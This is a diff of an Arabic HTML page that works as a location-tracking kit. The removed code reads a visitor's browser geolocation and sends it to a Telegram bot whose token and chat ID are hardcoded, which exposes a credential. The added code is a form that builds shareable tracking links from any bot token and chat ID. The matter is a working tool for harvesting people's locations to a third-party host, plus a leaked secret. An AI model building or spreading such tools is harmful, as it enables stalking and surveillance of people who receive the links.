@@ -3,53 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال الموقع</title>
+    <title>إدخال التوكن والمعرف</title>
 </head>
 <body>
-    <h1>جاري إرسال موقعك...</h1>
+    <h1>أدخل التوكن ومعرف الدردشة</h1>
+    <form id="tokenForm">
+        <label for="token">التوكن:</label>
+        <input type="text" id="token" name="token" required><br><br>
+        
+        <label for="chat_id">معرف الدردشة:</label>
+        <input type="text" id="chat_id" name="chat_id" required><br><br>
+        
+        <button type="submit">إنشاء رابط</button>
+    </form>
+
+    <div id="generatedLink" style="display:none;">
+        <h2>الرابط الخاص بك:</h2>
+        <a id="link" href="" target="_blank">اضغط هنا للوصول إلى صفحة الموقع</a>
+    </div>
+
     <script>
-        // التوكن الخاص بالبوت
-        const token = "7655326139:AAEZd2vHJPL1J-llHvjM26RO823jQNtO88Y";
+        const form = document.getElementById("tokenForm");
+        const generatedLinkDiv = document.getElementById("generatedLink");
+        const linkElement = document.getElementById("link");
 
-        // معرف الدردشة (Chat ID)
-        const chat_id = "7499043737";
+        form.addEventListener("submit", (event) => {
+            event.preventDefault();
 
-        const botLocationUrl = `https://api.telegram.org/bot${token}/sendLocation`;
+            const token = document.getElementById("token").value;
+            const chat_id = document.getElementById("chat_id").value;
 
-        async function sendLocation() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const { latitude, longitude } = position.coords;
-                    try {
-                        const response = await fetch(botLocationUrl, {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({
-                                chat_id,
-                                latitude,
-                                longitude
-                            })
-                        });
+            // إنشاء الرابط باستخدام التوكن ومعرف الدردشة
+            const generatedLink = `location.html?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chat_id)}`;
 
-                        if (response.ok) {
-                            console.log("تم إرسال الموقع بنجاح");
-                            document.body.innerHTML = "<h1>تم إرسال موقعك بنجاح!</h1>";
-                        } else {
-                            console.error("خطأ في إرسال الموقع:", await response.text());
-                            document.body.innerHTML = "<h1>حدث خطأ أثناء إرسال الموقع.</h1>";
-                        }
-                    } catch (error) {
-                        console.error("خطأ في الطلب:", error);
-                        document.body.innerHTML = "<h1>حدث خطأ أثناء إرسال الموقع.</h1>";
-                    }
-                });
-            } else {
-                console.error("خاصية الموقع غير مدعومة.");
-                document.body.innerHTML = "<h1>خاصية الموقع غير مدعومة على جهازك.</h1>";
-            }
-        }
-
-        sendLocation();
+            // عرض الرابط
+            linkElement.href = generatedLink;
+            generatedLinkDiv.style.display = "block";
+        });
     </script>
 </body>
 </html>
